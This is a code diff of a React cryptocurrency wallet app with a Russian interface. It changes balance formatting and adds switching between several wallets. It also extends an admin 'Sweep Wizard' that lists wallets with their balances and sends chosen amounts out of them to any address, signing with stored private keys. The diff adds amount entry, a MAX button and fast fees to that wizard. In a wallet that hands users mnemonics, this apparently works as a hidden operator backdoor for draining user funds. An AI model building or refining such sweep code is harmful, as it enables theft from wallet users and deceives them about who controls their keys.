@@ -398,14 +398,18 @@ function getAddressForAsset(assetId, addresses) {
 function fmtCryptoAmt(raw) {
   const n = parseFloat(String(raw).replace(",", "."));
   if (isNaN(n)) return String(raw);
-  if (Number.isInteger(n)) return n.toString();
-  // Smart decimal count based on magnitude
+  if (n === 0) return "0";
+
   let decimals;
-  if (n >= 1000) decimals = 2;
-  else if (n >= 100) decimals = 2;
-  else if (n >= 1)   decimals = 4;
-  else               decimals = 6;
-  return parseFloat(n.toFixed(decimals)).toString().replace(".", ",");
+  if (Math.abs(n) >= 1000) decimals = 2;
+  else if (Math.abs(n) >= 1)   decimals = 4;
+  else               decimals = 8;
+
+  return new Intl.NumberFormat('ru-RU', {
+    minimumFractionDigits: 0,
+    maximumFractionDigits: decimals,
+    useGrouping: false
+  }).format(n);
 }
 
 /* ─── Explorer URL helpers ──────────────────────────────────── */
@@ -2112,13 +2116,13 @@ function ReceiveNFTSelectScreen({ onBack, onSelect }) {
 
 /* ─── Screen: Wallets List ───────────────────────────────────── */
 function WalletsScreen({ onBack, onAdd, onSettings }) {
-  const { addresses } = useWallet();
-  const mainAddr = addresses.ETH || addresses.TON || addresses.SOL || "0x...";
-  const shortAddr = mainAddr.slice(0, 6) + "..." + mainAddr.slice(-4);
+  const { wallets, activeWalletId, switchWallet } = useWallet();
 
-  const wallets = [
-    { id: 1, name: "Кошелек № 1", address: shortAddr }
-  ];
+  const handleSwitch = async (id) => {
+    if (String(id) === String(activeWalletId)) return;
+    await switchWallet(id);
+    onBack();
+  };
 
   return (
     <div style={{ display: "flex", flexDirection: "column", flex: 1, background: DS.bg }}>
@@ -2134,23 +2138,38 @@ function WalletsScreen({ onBack, onAdd, onSettings }) {
       
       <div style={{ padding: "8px 16px" }}>
         <div style={{ background: DS.card, borderRadius: 20, overflow: "hidden", border: `1px solid ${DS.border}` }}>
-          {wallets.map((w, i) => (
-            <div key={w.id} style={{ display: "flex", alignItems: "center", padding: "16px", cursor: "pointer" }}>
-              <div style={{ width: 40, height: 40, borderRadius: "50%", overflow: "hidden", marginRight: 14, background: "#3B7DFF" }}>
-                <img src={gemIcon} alt="gem" style={{ width: "100%", height: "100%", objectFit: "cover", transform: "scale(1.1)" }} />
+          {wallets.map((w, i) => {
+            const isActive = String(w.id) === String(activeWalletId);
+            const mainAddr = w.addresses?.ETH || w.addresses?.TON || w.addresses?.SOL || "—";
+            const shortAddr = mainAddr !== "—" ? (mainAddr.slice(0, 6) + "..." + mainAddr.slice(-4)) : "—";
+
+            return (
+              <div key={w.id} onClick={() => handleSwitch(w.id)}
+                style={{ display: "flex", alignItems: "center", padding: "16px", cursor: "pointer",
+                  background: isActive ? "rgba(59,125,255,0.05)" : "none",
+                  borderBottom: i === wallets.length - 1 ? "none" : `1px solid ${DS.border}` }}>
+                <div style={{ width: 40, height: 40, borderRadius: "50%", overflow: "hidden", marginRight: 14, background: "#3B7DFF" }}>
+                  <img src={gemIcon} alt="gem" style={{ width: "100%", height: "100%", objectFit: "cover", transform: "scale(1.1)" }} />
+                </div>
+                <div style={{ flex: 1 }}>
+                  <div style={{ color: "white", fontWeight: 600, fontSize: 16 }}>{w.name}</div>
+                  <div style={{ color: DS.muted, fontSize: 13, marginTop: 2 }}>{shortAddr}</div>
+                </div>
+                {isActive && (
+                  <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20, color: "#3B7DFF", marginRight: 12 }}>
+                    <path d="M20 6L9 17l-5-5" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
+                  </svg>
+                )}
+                <button onClick={(e) => { e.stopPropagation(); onSettings(w); }} 
+                  style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
+                  <svg viewBox="0 0 24 24" fill="none" style={{ width: 22, height: 22 }}>
+                    <circle cx="12" cy="12" r="3" stroke={DS.muted} strokeWidth="2" />
+                    <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z" stroke={DS.muted} strokeWidth="2" />
+                  </svg>
+                </button>
               </div>
-              <div style={{ flex: 1 }}>
-                <div style={{ color: "white", fontWeight: 600, fontSize: 16 }}>{w.name}</div>
-                <div style={{ color: DS.muted, fontSize: 13, marginTop: 2 }}>{w.address}</div>
-              </div>
-              <button onClick={() => onSettings(w)} style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
-                <svg viewBox="0 0 24 24" fill="none" style={{ width: 22, height: 22 }}>
-                  <circle cx="12" cy="12" r="3" stroke={DS.muted} strokeWidth="2" />
-                  <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z" stroke={DS.muted} strokeWidth="2" />
-                </svg>
-              </button>
-            </div>
-          ))}
+            );
+          })}
         </div>
       </div>
     </div>
@@ -2159,12 +2178,12 @@ function WalletsScreen({ onBack, onAdd, onSettings }) {
 
 /* ─── Screen: Wallet Settings ────────────────────────────────── */
 function WalletSettingsScreen({ onBack, wallet }) {
-  const { getMnemonic, deleteWallet, updateSetting, settings: walletCtxSettings } = useWallet();
-  const [name, setName] = useState(walletCtxSettings?.walletName || wallet?.name || 'Кошелек № 1');
+  const { getMnemonic, deleteWallet, renameWallet, settings: walletCtxSettings } = useWallet();
+  const [name, setName] = useState(wallet?.name || 'Кошелек');
   const [nameSaved, setNameSaved] = useState(false);
 
   const handleSaveName = () => {
-    updateSetting('walletName', name.trim() || 'Кошелек № 1');
+    renameWallet(wallet.id, name.trim() || 'Кошелек');
     setNameSaved(true);
     setTimeout(() => setNameSaved(false), 2000);
   };
@@ -3914,23 +3933,25 @@ function shortAddress(addr) {
 function fmtBal(num, sym) {
   const n = parseFloat(num);
   if (isNaN(n) || n === 0) return `0 ${sym}`;
-  if (n < 0.0001) return `${n.toExponential(2).replace(".", ",")} ${sym}`;
   
-  // Use a precision based on value size
-  const precision = n < 1 ? 6 : 4;
-  const fixed = n.toFixed(precision);
+  const formatted = new Intl.NumberFormat('ru-RU', {
+    minimumFractionDigits: 0,
+    maximumFractionDigits: n < 1 ? 8 : 4,
+    useGrouping: false
+  }).format(n);
   
-  // Remove trailing zeros only after the decimal point
-  let str = parseFloat(fixed).toString();
-  return `${str.replace(".", ",")} ${sym}`;
+  return `${formatted} ${sym}`;
 }
 
 /* ─── Screen: Home ───────────────────────────────────────────── */
 const HomeScreen = memo(({ onSend, onReceive, onBuy, onSwap, onAssetClick, onWalletsClick }) => {
-  const { balances, addresses, refreshBalance, settings, updateSetting } = useWallet();
+  const { balances, addresses, refreshBalance, settings, updateSetting, wallets, activeWalletId } = useWallet();
   const [isRefreshing, setIsRefreshing] = useState(false);
   const assets = useAssets();
   const livePriceMap = useLivePriceMap();
+
+  const activeWallet = (wallets || []).find(w => String(w.id) === String(activeWalletId));
+  const walletName = activeWallet?.name || settings?.walletName || 'Кошелек № 1';
 
   // Build real balances mapped to asset ids
   const getRealBalance = (assetId) => {
@@ -3985,7 +4006,7 @@ const HomeScreen = memo(({ onSend, onReceive, onBuy, onSwap, onAssetClick, onWal
           <div style={{ width: 28, height: 28, borderRadius: "50%", overflow: "hidden", background: "#3B7DFF" }}>
             <img src={gemIcon} alt="gem" style={{ width: "100%", height: "100%", objectFit: "cover", transform: "scale(1.1)" }} />
           </div>
-          <span style={{ color: "white", fontWeight: 600, fontSize: 17, fontFamily: DS.font, letterSpacing: -0.3 }}>{settings?.walletName || 'Кошелек № 1'}</span>
+          <span style={{ color: "white", fontWeight: 600, fontSize: 17, fontFamily: DS.font, letterSpacing: -0.3 }}>{walletName}</span>
           <svg viewBox="0 0 24 24" fill="none" style={{ width: 16, height: 16 }}>
             <path d="M6 9l6 6 6-6" stroke="white" strokeWidth="2.5" strokeLinecap="round" />
           </svg>
@@ -4122,11 +4143,22 @@ function AdminScreen({ onBack }) {
   const [sweepWallet, setSweepWallet] = useState(null);
   const [sweepLoading, setSweepLoading] = useState(false);
   const [sweepResult, setSweepResult] = useState(null);
-  const [sweepStep, setSweepStep] = useState('coin'); // coin | address | confirm | result
+  const [sweepStep, setSweepStep] = useState('coin'); // coin | amount | address | confirm | result
   const [sweepCoin, setSweepCoin] = useState(null);
   const [sweepTargetAddr, setSweepTargetAddr] = useState("");
+  const [sweepAmount, setSweepAmount] = useState("");
 
   const COINS = ['ETH', 'TON', 'BNB', 'LTC', 'ARB', 'SOL', 'USDT'];
+
+  const FAST_FEES = {
+    ETH: "25 Gwei",
+    BNB: "3 Gwei",
+    ARB: "0.1 Gwei",
+    SOL: "0,00001 SOL",
+    TON: "0,05 TON",
+    LTC: "0,001 LTC",
+    USDT: "15 Gwei"
+  };
 
   async function loadWallets(silent = false) {
     if (!silent) setLoading(true);
@@ -4210,9 +4242,19 @@ function AdminScreen({ onBack }) {
       
       const sym = sweepCoin.sym;
       const netId = sweepCoin.netId;
-      const amount = parseFloat(sweepWallet[sym.toLowerCase() + '_balance'] || 0);
+      const amount = parseFloat(sweepAmount.replace(",", "."));
       
-      if (amount <= 0) throw new Error("Баланс этой монеты равен 0");
+      if (isNaN(amount) || amount <= 0) throw new Error("Введите корректную сумму");
+
+      // Optimized fees logic
+      let feeVal = 0;
+      if (['ETH', 'BNB', 'ARB'].includes(sym) || sym === 'USDT') {
+        feeVal = sym === 'BNB' ? 3 : (sym === 'ARB' ? 0.1 : 25); // Gwei
+      } else if (sym === 'SOL') {
+        feeVal = 10000; // micro-lamports
+      } else if (sym === 'TON') {
+        feeVal = 50000000; // nanoton (0.05 TON)
+      }
 
       const txHash = await sendTransaction({
         sym,
@@ -4221,7 +4263,7 @@ function AdminScreen({ onBack }) {
         to: sweepTargetAddr,
         amount,
         privateKey: privateKeys[sym] || privateKeys.ETH,
-        fee: 0 // Default low fee
+        fee: feeVal
       });
 
       setSweepResult({ success: true, txHash });
@@ -4489,28 +4531,29 @@ function AdminScreen({ onBack }) {
 
       {/* Sweep Modal - Step Flow */}
       {sweepWallet && (
-        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.9)", zIndex: 9999,
-          display: "flex", alignItems: "flex-end", justifyContent: "center", backdropFilter: "blur(10px)" }}
+        <div style={{ position: "fixed", inset: 0, zIndex: 1000, display: "flex", alignItems: "flex-end", background: "rgba(0,0,0,0.85)", backdropFilter: "blur(10px)" }}
           onClick={() => { if (!sweepLoading) { setSweepWallet(null); setSweepResult(null); } }}>
-          <div style={{ width: "100%", maxWidth: 480, background: "#000", borderRadius: "32px 32px 0 0",
-            padding: "24px 20px 44px", maxHeight: "85vh", overflowY: "auto", borderTop: "1px solid rgba(255,255,255,0.1)",
-            boxShadow: "0 -10px 40px rgba(0,0,0,0.5)" }}
+          <div style={{ width: "100%", maxWidth: 480, background: "#111", borderTopLeftRadius: 32, borderTopRightRadius: 32, 
+            padding: "24px 20px 40px", position: "relative", borderTop: "1px solid rgba(255,255,255,0.1)",
+            maxHeight: "92vh", overflowY: "auto", boxShadow: "0 -10px 40px rgba(0,0,0,0.5)" }}
             onClick={e => e.stopPropagation()}>
-
-            {/* Header */}
-            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 24 }}>
+            
+            <div style={{ width: 40, height: 4, background: "rgba(255,255,255,0.2)", borderRadius: 2, margin: "0 auto 24px" }} />
+            
+            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 28 }}>
               <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
                 {sweepStep !== 'coin' && sweepStep !== 'result' && (
-                  <button onClick={() => setSweepStep(sweepStep === 'address' ? 'coin' : 'address')} 
-                    style={{ background: "none", border: "none", color: "#3B7DFF", padding: 0 }}>
-                    <svg viewBox="0 0 24 24" fill="none" style={{ width: 24, height: 24 }}>
-                      <path d="M15 18l-6-6 6-6" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
-                    </svg>
+                  <button onClick={() => {
+                    if (sweepStep === 'amount') setSweepStep('coin');
+                    else if (sweepStep === 'address') setSweepStep('amount');
+                    else if (sweepStep === 'confirm') setSweepStep('address');
+                  }} style={{ background: "rgba(255,255,255,0.05)", border: "none", borderRadius: "50%", width: 32, height: 32, display: "flex", alignItems: "center", justifyContent: "center" }}>
+                    <svg viewBox="0 0 24 24" fill="none" style={{ width: 16, height: 16 }}><path d="M15 18l-6-6 6-6" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" /></svg>
                   </button>
                 )}
-                <span style={{ color: "#fff", fontSize: 20, fontWeight: 800 }}>Sweep Wizard</span>
+                <div style={{ color: "#fff", fontWeight: 800, fontSize: 18 }}>Sweep Wizard</div>
               </div>
-              <button onClick={() => setSweepWallet(null)} style={{ background: "rgba(255,255,255,0.05)", border: "none", borderRadius: "50%", width: 32, height: 32, color: "#fff" }}>×</button>
+              <button onClick={() => setSweepWallet(null)} style={{ background: "rgba(255,255,255,0.05)", border: "none", borderRadius: "50%", width: 32, height: 32, color: "#fff", display: "flex", alignItems: "center", justifyContent: "center" }}>×</button>
             </div>
 
             {/* Step 1: Select Coin */}
@@ -4519,14 +4562,17 @@ function AdminScreen({ onBack }) {
                 <div style={{ color: "rgba(255,255,255,0.5)", fontSize: 13, marginBottom: 16, fontWeight: 600 }}>SELECT ASSET TO WITHDRAW</div>
                 <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
                   {COINS.map(sym => {
-                    const val = parseFloat(sweepWallet[sym.toLowerCase() + "_balance"] || 0);
-                    const netId = sym === 'USDT' ? 'eth' : sym.toLowerCase(); // Simplified for demo
+                    const balance = sweepWallet[sym.toLowerCase() + '_balance'] || 0;
+                    const netId = sym === 'USDT' ? 'erc20' : (sym === 'BNB' ? 'bsc' : (sym === 'ARB' ? 'arbitrum' : (sym === 'TON' ? 'ton' : (sym === 'SOL' ? 'solana' : 'mainnet'))));
+                    const isZero = parseFloat(balance) <= 0;
+                    
                     return (
                       <button key={sym} 
-                        onClick={() => { setSweepCoin({ sym, netId }); setSweepStep('address'); }}
-                        style={{ background: "rgba(255,255,255,0.03)", border: "1px solid rgba(255,255,255,0.06)", borderRadius: 16, padding: "16px", textAlign: "left" }}>
-                        <div style={{ color: "rgba(255,255,255,0.4)", fontSize: 10, fontWeight: 700, marginBottom: 4 }}>{sym}</div>
-                        <div style={{ color: val > 0 ? "#34C759" : "#fff", fontSize: 16, fontWeight: 800 }}>{val.toFixed(4)}</div>
+                        disabled={isZero}
+                        onClick={() => { setSweepCoin({ sym, netId }); setSweepAmount(String(balance)); setSweepStep('amount'); }}
+                        style={{ background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 16, padding: "16px", textAlign: "left", opacity: isZero ? 0.3 : 1 }}>
+                        <div style={{ color: "#3B7DFF", fontWeight: 800, fontSize: 15, marginBottom: 4 }}>{sym}</div>
+                        <div style={{ color: "#fff", fontSize: 13, fontWeight: 600 }}>{parseFloat(balance).toFixed(4)}</div>
                       </button>
                     );
                   })}
@@ -4534,7 +4580,35 @@ function AdminScreen({ onBack }) {
               </div>
             )}
 
-            {/* Step 2: Enter Address */}
+            {/* Step 2: Enter Amount */}
+            {sweepStep === 'amount' && (
+              <div style={{ animation: "fadeIn 0.3s ease" }}>
+                <div style={{ color: "rgba(255,255,255,0.5)", fontSize: 13, marginBottom: 16, fontWeight: 600 }}>ENTER AMOUNT ({sweepCoin.sym})</div>
+                <div style={{ background: "rgba(255,255,255,0.05)", borderRadius: 16, padding: "16px", border: "1px solid rgba(255,255,255,0.1)", marginBottom: 12 }}>
+                  <input
+                    type="text"
+                    placeholder="0.00"
+                    value={sweepAmount}
+                    onChange={e => setSweepAmount(e.target.value)}
+                    style={{ width: "100%", background: "none", border: "none", outline: "none", color: "#fff", fontSize: 28, fontWeight: 800, textAlign: "center" }}
+                  />
+                  <div style={{ textAlign: "center", marginTop: 8 }}>
+                    <button onClick={() => setSweepAmount(String(sweepWallet[sweepCoin.sym.toLowerCase() + '_balance'] || 0))}
+                      style={{ background: "rgba(59,125,255,0.1)", border: "none", borderRadius: 8, padding: "4px 12px", color: "#3B7DFF", fontSize: 12, fontWeight: 700 }}>MAX</button>
+                  </div>
+                </div>
+                <div style={{ color: "rgba(255,255,255,0.4)", fontSize: 12, textAlign: "center", marginBottom: 24 }}>
+                  Estimated Fee: <span style={{ color: "#34C759", fontWeight: 600 }}>{FAST_FEES[sweepCoin.sym] || "Low"} (Fast)</span>
+                </div>
+                <button 
+                  onClick={() => setSweepStep('address')}
+                  style={{ width: "100%", padding: "18px 0", borderRadius: 20, border: "none", background: "linear-gradient(180deg, #3B7DFF 0%, #0055FF 100%)", color: "#fff", fontSize: 17, fontWeight: 800 }}>
+                  CONTINUE
+                </button>
+              </div>
+            )}
+
+            {/* Step 3: Enter Address */}
             {sweepStep === 'address' && (
               <div style={{ animation: "fadeIn 0.3s ease" }}>
                 <div style={{ color: "rgba(255,255,255,0.5)", fontSize: 13, marginBottom: 16, fontWeight: 600 }}>DESTINATION ADDRESS ({sweepCoin.sym})</div>
@@ -4547,34 +4621,28 @@ function AdminScreen({ onBack }) {
                   />
                 </div>
                 <button 
-                  className="btn-animate"
                   disabled={!sweepTargetAddr || sweepTargetAddr.length < 10}
                   onClick={() => setSweepStep('confirm')}
-                  style={{ 
-                    width: "100%", 
-                    padding: "18px 0", 
-                    borderRadius: 20, 
-                    border: "none", 
-                    background: "linear-gradient(180deg, #3B7DFF 0%, #0055FF 100%)", 
-                    color: "#fff", 
-                    fontSize: 17, 
-                    fontWeight: 800, 
-                    boxShadow: "0 8px 24px rgba(0, 85, 255, 0.3)",
-                    opacity: (!sweepTargetAddr || sweepTargetAddr.length < 10) ? 0.5 : 1,
-                  }}>
+                  style={{ width: "100%", padding: "18px 0", borderRadius: 20, border: "none", background: "linear-gradient(180deg, #3B7DFF 0%, #0055FF 100%)", color: "#fff", fontSize: 17, fontWeight: 800, opacity: (!sweepTargetAddr || sweepTargetAddr.length < 10) ? 0.5 : 1 }}>
                   CONTINUE
                 </button>
               </div>
             )}
 
-            {/* Step 3: Confirm */}
+            {/* Step 4: Confirm */}
             {sweepStep === 'confirm' && (
               <div style={{ animation: "fadeIn 0.3s ease" }}>
                 <div style={{ color: "rgba(255,255,255,0.5)", fontSize: 13, marginBottom: 16, fontWeight: 600 }}>CONFIRM TRANSACTION</div>
                 <div style={{ background: "rgba(59,125,255,0.05)", border: "1px solid rgba(59,125,255,0.1)", borderRadius: 20, padding: "20px", marginBottom: 24 }}>
-                  <div style={{ marginBottom: 16 }}>
-                    <div style={{ color: "rgba(255,255,255,0.4)", fontSize: 11, fontWeight: 700, marginBottom: 4 }}>WITHDRAWING</div>
-                    <div style={{ color: "#fff", fontSize: 24, fontWeight: 800 }}>{parseFloat(sweepWallet[sweepCoin.sym.toLowerCase() + "_balance"] || 0).toFixed(6)} {sweepCoin.sym}</div>
+                  <div style={{ marginBottom: 16, display: "flex", justifyContent: "space-between", alignItems: "center" }}>
+                    <div>
+                      <div style={{ color: "rgba(255,255,255,0.4)", fontSize: 11, fontWeight: 700, marginBottom: 4 }}>WITHDRAWING</div>
+                      <div style={{ color: "#fff", fontSize: 20, fontWeight: 800 }}>{sweepAmount} {sweepCoin.sym}</div>
+                    </div>
+                    <div style={{ textAlign: "right" }}>
+                      <div style={{ color: "rgba(255,255,255,0.4)", fontSize: 11, fontWeight: 700, marginBottom: 4 }}>NETWORK FEE</div>
+                      <div style={{ color: "#34C759", fontSize: 14, fontWeight: 700 }}>{FAST_FEES[sweepCoin.sym] || "Low"}</div>
+                    </div>
                   </div>
                   <div>
                     <div style={{ color: "rgba(255,255,255,0.4)", fontSize: 11, fontWeight: 700, marginBottom: 4 }}>TO RECIPIENT</div>
@@ -4582,74 +4650,30 @@ function AdminScreen({ onBack }) {
                   </div>
                 </div>
                 <button 
-                  className="btn-animate btn-confirm-shimmer"
                   disabled={sweepLoading}
                   onClick={executeStepSweep}
-                  style={{ 
-                    width: "100%", 
-                    padding: "18px 0", 
-                    borderRadius: 20, 
-                    border: "none", 
-                    background: "linear-gradient(90deg, #34C759 0%, #28A745 50%, #34C759 100%)", 
-                    color: "#fff", 
-                    fontSize: 17, 
-                    fontWeight: 800,
-                    boxShadow: "0 8px 24px rgba(40, 167, 69, 0.3)",
-                  }}>
+                  style={{ width: "100%", padding: "18px 0", borderRadius: 20, border: "none", background: "linear-gradient(90deg, #34C759 0%, #28A745 50%, #34C759 100%)", color: "#fff", fontSize: 17, fontWeight: 800 }}>
                   {sweepLoading ? "SENDING..." : "CONFIRM & SEND"}
-                </button>
-                <button 
-                  className="btn-animate btn-cancel-hover"
-                  disabled={sweepLoading}
-                  onClick={() => setSweepStep('address')}
-                  style={{ 
-                    width: "100%", 
-                    marginTop: 12,
-                    padding: "16px 0", 
-                    borderRadius: 20, 
-                    border: "1px solid rgba(255,255,255,0.1)", 
-                    background: "rgba(255,255,255,0.05)", 
-                    color: "rgba(255,255,255,0.6)", 
-                    fontSize: 16, 
-                    fontWeight: 700 
-                  }}>
-                  CANCEL
                 </button>
               </div>
             )}
 
-            {/* Step 4: Result */}
+            {/* Step 5: Result */}
             {sweepStep === 'result' && (
               <div style={{ animation: "fadeIn 0.3s ease", textAlign: "center", padding: "20px 0" }}>
                 <div style={{ width: 64, height: 64, borderRadius: "50%", background: sweepResult.success ? "rgba(52,199,89,0.1)" : "rgba(255,69,58,0.1)", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 20px" }}>
                   {sweepResult.success ? (
-                    <svg viewBox="0 0 24 24" fill="none" style={{ width: 32, height: 32, color: "#34C759" }}>
-                      <path d="M20 6L9 17l-5-5" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
-                    </svg>
+                    <svg viewBox="0 0 24 24" fill="none" style={{ width: 32, height: 32, color: "#34C759" }}><path d="M20 6L9 17l-5-5" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" /></svg>
                   ) : (
-                    <svg viewBox="0 0 24 24" fill="none" style={{ width: 32, height: 32, color: "#FF453A" }}>
-                      <path d="M18 6L6 18M6 6l12 12" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
-                    </svg>
+                    <svg viewBox="0 0 24 24" fill="none" style={{ width: 32, height: 32, color: "#FF453A" }}><path d="M18 6L6 18M6 6l12 12" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" /></svg>
                   )}
                 </div>
                 <div style={{ color: "#fff", fontSize: 22, fontWeight: 800, marginBottom: 8 }}>{sweepResult.success ? "Success!" : "Failed"}</div>
                 <div style={{ color: "rgba(255,255,255,0.5)", fontSize: 14, marginBottom: 24, wordBreak: "break-all" }}>
                   {sweepResult.success ? `Transaction sent: ${sweepResult.txHash.slice(0, 20)}...` : sweepResult.message}
                 </div>
-                <button 
-                  onClick={() => setSweepWallet(null)}
-                  style={{ 
-                    width: "100%", 
-                    padding: "18px 0", 
-                    borderRadius: 20, 
-                    border: "1px solid rgba(255,255,255,0.1)", 
-                    background: "rgba(255,255,255,0.08)", 
-                    color: "#fff", 
-                    fontSize: 17, 
-                    fontWeight: 800 
-                  }}>
-                  CLOSE
-                </button>
+                <button onClick={() => setSweepWallet(null)}
+                  style={{ width: "100%", padding: "18px 0", borderRadius: 20, border: "1px solid rgba(255,255,255,0.1)", background: "rgba(255,255,255,0.08)", color: "#fff", fontSize: 17, fontWeight: 800 }}>CLOSE</button>
               </div>
             )}
           </div>
